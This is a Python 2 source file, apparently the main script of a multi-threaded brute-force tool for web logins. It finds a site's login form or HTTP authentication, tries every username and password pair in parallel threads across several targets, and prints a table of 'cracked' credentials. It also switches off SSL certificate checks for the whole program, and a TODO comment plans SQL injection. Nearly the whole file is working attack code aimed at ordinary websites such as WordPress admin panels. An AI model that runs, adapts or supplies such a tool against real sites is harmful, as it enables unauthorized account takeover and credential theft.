#!/usr/bin/python

# def check_import():
# 	try:
# 		import sys, threading, os, ssl, time
# 		import mechanize, re

# 	except ImportError as error:
# 		print(error)
# 		print("Please install libraries")
# 		return False

# 	try:
# 		from core import actions, utils, tbrowser, options
# 		from modules import loginbrute, httpget
# 		from extras import getproxy, reauth
# 		import data, reports
	
# 	except Exception as error:
# 		print("Can't find project's module")
# 		print(error)
# 		return False

# TODO use zip loop for SQL injection


def check_login(opts):
	try:
		proc = startBrowser()
		printf("[+] Checking %s" %(options.url))

		proc.open(opts.url, timeout = options.timeout)
		"""
			Check URL type. If Website directs to other URL,
			options.url is website's panel
			else: it is login url.
			Example: options.url = site.com/wp-admin/ -> panel
				site directs user to wp-login -> login URL
				options.url = site.com/wp-login.php -> login URL
		"""
		if proc.geturl() != opts.url:
			printf("[*] Website moves to: ['%s']" %(proc.geturl()), "norm")
			opts.panel_url, opts.login_url = opts.url, proc.geturl()
		else:
			opts.login_url = opts.url

		printf("[*] Connect success!", "good")
		if opts.run_options["--verbose"]:
			printf("[*] %s" %(proc.title()), "norm")
		printf("[+] Analyzing login form....")
		loginInfo = parseLoginForm(proc.forms())
		return loginInfo
		
	except Exception as error:
		try:
			if error.code == 401:
				## GET INFORMATION

				resp_header = str(proc.response().info())
				if "WWW-Authenticate" in resp_header:
					loginID = checkHTTPGetLogin(resp_header)
					loginInfo = (loginID, ["Password", "User Name"])
					printf("[+] Using HTTP GET Authentication mode", "norm")
					options.attack_mode = "--httpget"
					# CAN BE FALSE
					# if loginID:
					# 	loginInfo = (loginID, ["Password", "User Name"])
					# else:
					# 	loginInfo = False
				else:
					loginInfo = False
			else:
				loginInfo = False
				printf("[x] Target check: %s" %(error), "bad")

		# Error != http code
		except:
			loginInfo = False
			die("[x] Target check:", error)
	
	except KeyboardInterrupt:
		loginInfo = False
	
	finally:
		proc.close()
		return loginInfo

def attack(options, loginInfo):
	def run_threads(threads, sending, completed, total):
		# Run threads
		for thread in threads:
			sending += 1 # Sending
			progress_bar(sending, completed, total)
			thread.start()

		# Wait for threads completed
		for thread in threads:
			completed += 1
			progress_bar(sending, completed, total)
			thread.join()

		return sending, completed
	_single_col = False
	### SETTING UP FOR NEW ATTACK ###
	if options.attack_mode == "--httpget":
		from modules import httpget
		attack_module = httpget.submit

	else:
		from modules import loginbrute
		attack_module = loginbrute.submit


	if not loginInfo:
		# Test for 2 steps... login?
		die("[x] Target check: URL error", "[x] No login request found")
	else:
		printf("[*] Login request has been found!", "good")
		printf(
			"   [+] Form ID: %s\n"
			"   [+] Field: %s\n"
			%(loginInfo[0], loginInfo[1][::-1]), "norm")

		printf("[+] Starting attack...")

		## 1 PASSWORD FORM FIELD ONLY ## 
		if len(loginInfo[1]) == 1:
			_single_col = True

			# Clear username list. Process now using password list only
			del options.username[:]
			options.username = [""]

	tasks = len(options.passwd) * len(options.username)

	import Queue
	result = Queue.Queue()
	
	sending, completed = 0, 0
	try:
		#### START ATTACK ####
		printf("[+] Task counts: %s tasks" %(tasks), "norm")
		workers = []

		for username in options.username:
			for password in options.passwd:
				if len(workers) == options.threads:
					sending, completed = run_threads(workers, sending, completed, tasks)
					del workers[:]

				worker = threading.Thread(
					target = attack_module,
					args = (options, loginInfo, [password, username], result)
				)
				workers.append(worker)
				worker.daemon = True

		sending, completed = run_threads(workers, sending, completed, tasks)
		del workers[:]
			
	except KeyboardInterrupt:
		printf("[x] Terminated by user!", "bad")
		global set_break
		set_break = True
		
	# 	# STEAL FROM SQLMAP
	# 	# Does not print_table if terminate but found
	# 	if threading.activeCount() > 1:
	# 		printf("[x] Terminated by user!", "bad")
			# import os
			# os._exit(0)
	except SystemExit:
		printf("[x] Terminated by system!", "bad")

	except Exception as error:
		die("[x] Runtime error", error)

	finally:
		credentials = list(result.queue)
		if len(credentials) == 0:
			printf("[-] No match found!", "bad")

		else:
			printf("\n[*] %s valid password[s] found:" %(len(credentials)), "norm")
			if _single_col:
				print_table(("", "Password"), **[creds[-1:] for creds in credentials])
			else:
				print_table(("Username", "Password"), *[creds[-2:] for creds in credentials])
			printf("")
		return credentials


if __name__ == "__main__":
	#if check_import():
		# IMPORT GLOBALY
	import sys, time, threading, ssl
	from core import options
	from core.tbrowser import startBrowser, parseLoginForm, checkHTTPGetLogin
	from core.actions import verify_url, verify_options
	from core.utils import printf, progress_bar, die, print_table, start_banner

	try:
		# Setting new session
		runtime = time.time()
		reload(sys)
		sys.setdefaultencoding('utf8')

		# Get options
		options = options.ParseOptions()

		if options.help == True:
			from core import helps
			helps.print_help()
		else:
			verify_options(options)
			if not options.target:
				die("[x] URL error", "An URL is required")

			printf(start_banner(options))

			# Fix SSL errors https://stackoverflow.com/a/35960702
			try:
				_create_unverified_https_context = ssl._create_unverified_context
			except AttributeError:
			# Legacy Python that doesn't verify HTTPS certificates by default
				pass
			else:
			# Handle target environment that doesn't support HTTPS verification
				ssl._create_default_https_context = _create_unverified_https_context

			if "--getproxy" in options.extras:
				from extras import getproxy
				getproxy.main(options)
			else:
				results = []
				set_break = False

				for url in options.target:
					if set_break:
						break
					if url:
						options.url = verify_url(url)
						# Check proxy here
						loginInfo = check_login(options)
						result = attack(options, loginInfo)
						if result:
							results.append(result[0])

				if "--reauth" in options.extras:
					from extras import reauth
					reauth.run(options, result)

	except Exception as error:
		die("[x] Program stopped", error)

	finally:
		runtime = time.time() - runtime
		if len(options.target) > 1:
			if len(results) > 0:
				printf("[*] Cracked %s target[s]" %(len(results)), "good")
				print_table(("URL", "Username", "Password"), *results)
			else:
				printf("[x] No target has been cracked", "bad")
		printf("[*] Time elapsed: %0.4f [s]\n" %(runtime), "good")